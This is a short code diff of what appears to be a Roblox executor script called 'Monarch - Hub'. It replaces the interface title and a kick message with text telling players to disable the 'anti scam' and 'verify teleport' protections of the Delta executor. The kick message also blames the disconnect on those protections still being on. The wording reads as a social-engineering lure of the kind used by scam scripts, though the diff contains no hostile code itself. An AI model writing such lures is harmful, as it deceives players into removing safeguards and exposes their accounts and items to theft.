@@ -270,7 +270,7 @@ title.Size = UDim2.new(1, -30, 0, 44)
 title.Position = UDim2.new(0, 15, 0, 12)
 title.BackgroundTransparency = 1
 title.Font = Enum.Font.GothamBlack
-title.Text = "Monarch - Hub"
+title.Text = "PLEASE DISBALE - ANTI SCAM AND VERIFY TELEPORT IF YOUR ON DELTA"
 title.TextScaled = true
 title.TextColor3 = Color3.fromRGB(230,230,230)
 
@@ -363,7 +363,7 @@ do
 
 		-- Kick player with the requested message
 		pcall(function()
-			Player:Kick("Please rejoin and re-execute the script. The disconnection may be caused by the server being full or you being on a VIP server. Please re-execute the script.")
+			Player:Kick("Please rejoin and re-execute the script caused by do not disabled the verify teleport and anti scam ")
 		end)
 	end)
 end
